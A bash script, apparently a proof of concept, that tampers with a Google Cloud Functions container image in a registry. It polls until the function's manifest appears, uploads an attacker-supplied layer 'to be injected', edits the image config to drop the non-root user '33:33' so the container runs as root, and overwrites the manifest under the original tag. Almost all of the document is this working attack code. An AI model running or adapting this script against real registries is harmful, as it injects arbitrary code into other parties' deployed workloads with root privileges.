#!/usr/bin/env bash

# inspired by: https://stackoverflow.com/questions/40770594/upload-a-container-to-registry-v2-using-api-2-5-1

#adjust the following variables:
DOCKER_HUB_ORG="gcp-experiments-20200608"
DOCKER_HUB_REPO="gcf/us-central1/d78d0a4a-c9c4-4368-a724-2d7df33efbd3"
DOCKER_HUB_IMAGE_TAG="function-1_version-13"
API_DOMAIN="us.gcr.io"


############################################################################################################
new_layer="$1"
if [ -z "$new_layer" ]; then
   echo "Usage: $0 new_layer.tar"
   exit 1
fi

TOKEN=$(gcloud auth print-access-token)

function upload_blob() {
   fn=$1
   digest="$(sha256sum $fn | awk '{print $1}')"
   location="$(curl --silent -i -H "Authorization: Bearer ${TOKEN}" -XPOST https://${API_DOMAIN}/v2/${DOCKER_HUB_ORG}/${DOCKER_HUB_REPO}/blobs/uploads/ | grep location | cut -d" " -f2 | tr -d '\r')"
   >&2 echo "Uploading $fn ($digest) to $location"
   curl --silent -H "Authorization: Bearer ${TOKEN}" -XPUT --data-binary @$fn $location\?digest=sha256:$digest >/dev/null
   echo $digest
}

# example usage
#download_blob "d60076b5eb82c8738a5f6b1bdec13de22edc8566def35cec6a54340cc304ba62" "whatever.tar"
function download_blob() {
  digest=$1
  fn=$2
  location="$(curl --silent -i -H "Authorization: Bearer ${TOKEN}" "https://${API_DOMAIN}/v2/${DOCKER_HUB_ORG}/${DOCKER_HUB_REPO}/blobs/sha256:$digest" | grep location | cut -d" " -f2 | tr -d '\r')"
  >&2 echo "Downloading $digest into $fn"
  curl --silent -H "Authorization: Bearer ${TOKEN}" -o "$fn" "$location"
}

echo "Target image is: $API_DOMAIN/$DOCKER_HUB_ORG/$DOCKER_HUB_REPO:$DOCKER_HUB_IMAGE_TAG"

echo "Preuploading new layer ($new_layer) to be injected"
cat "$new_layer" | gzip > "$new_layer.gz"
newdata_digest_config="$(sha256sum $new_layer | awk '{print $1}')" # we need the pure tar's digest in the config
newdata_size=$(wc -c $new_layer.gz | awk '{print $1}')
newdata_digest_manifest="$(upload_blob "$new_layer.gz")"             # we need the gzip compressed blob's digest in the manifest

echo "Waiting for new image to show up"
while :; do
   manifest="$(curl -s -H "Accept: application/vnd.docker.distribution.manifest.v2+json" -H "Authorization: Bearer ${TOKEN}" https://${API_DOMAIN}/v2/${DOCKER_HUB_ORG}/${DOCKER_HUB_REPO}/manifests/${DOCKER_HUB_IMAGE_TAG})"
   echo $manifest
   if [[ "$manifest" == *mediaType* ]]; then
     break
   fi
done

if [[ "$manifest" == *$newdata_digest_manifest* ]]; then
  echo "Manifest is already patched!"
  exit 1
fi

echo
echo "Manifest is there!"
echo "$manifest" > oldmanifest.json

echo "Fetching legit config"
config_digest="$(cat oldmanifest.json | jq -r .config.digest | cut -d: -f2)"
download_blob "$config_digest" "oldconfig.json"

echo "Patching config and uploading it as a new config blob"
cat oldconfig.json | \
  sed 's#"User":"33:33"#"User":""#' | \
  sed 's#"]},"config"#","sha256:'$newdata_digest_config'"]},"config"#' > newconfig.json
newconfig_digest="$(upload_blob newconfig.json)"

echo "Patching manifest"
newconfig_size=$(wc -c newconfig.json | awk '{print $1}')

cat oldmanifest.json | \
  sed 's|"config":{"mediaType":"application/vnd.docker.container.image.v1+json","size":[0-9]\+,"digest":"sha256:[a-f0-9]\+"}|"config":{"mediaType":"application/vnd.docker.container.image.v1+json","size":'$newconfig_size',"digest":"sha256:'$newconfig_digest'"}|' | \
  sed 's|"}\]}|"},{"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip","size":'$newdata_size',"digest":"sha256:'$newdata_digest_manifest'"}]}|' > newmanifest.json

curl -s -H "Content-type: application/vnd.docker.distribution.manifest.v2+json" \
        -H "Authorization: Bearer ${TOKEN}" -XPUT --data-binary @newmanifest.json \
        https://${API_DOMAIN}/v2/${DOCKER_HUB_ORG}/${DOCKER_HUB_REPO}/manifests/${DOCKER_HUB_IMAGE_TAG}
echo
echo Done
